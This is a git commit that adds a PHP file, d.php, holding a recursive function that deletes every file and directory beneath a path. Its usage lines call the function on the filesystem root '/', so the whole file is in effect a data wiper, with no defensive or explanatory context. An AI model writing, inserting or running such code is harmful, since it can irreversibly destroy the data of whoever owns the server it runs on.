8c0b9546dbe708b915ffd367d746c3a41b535c1e
sbstyanbasilsalo <89746717+sbstyanbasilsalo@users.noreply.github.com>
2024-08-23 18:53:06 +0300

    Create d.php

---
+++ d.php
@@ -0,0 +1,27 @@
+function deleteAllContents($dir) {
+    // Check if the directory exists
+    if (!is_dir($dir)) {
+        return;
+    }
+
+    // Get all the files and folders in the directory
+    $files = array_diff(scandir($dir), array('.', '..'));
+
+    foreach ($files as $file) {
+        // Construct the full path
+        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
+
+        // If it's a directory, recursively delete it
+        if (is_dir($filePath)) {
+            deleteAllContents($filePath);
+            rmdir($filePath); // Remove the directory itself
+        } else {
+            // If it's a file, delete it
+            unlink($filePath);
+        }
+    }
+}
+
+// Usage
+$directory = '/';
+deleteAllContents($directory);
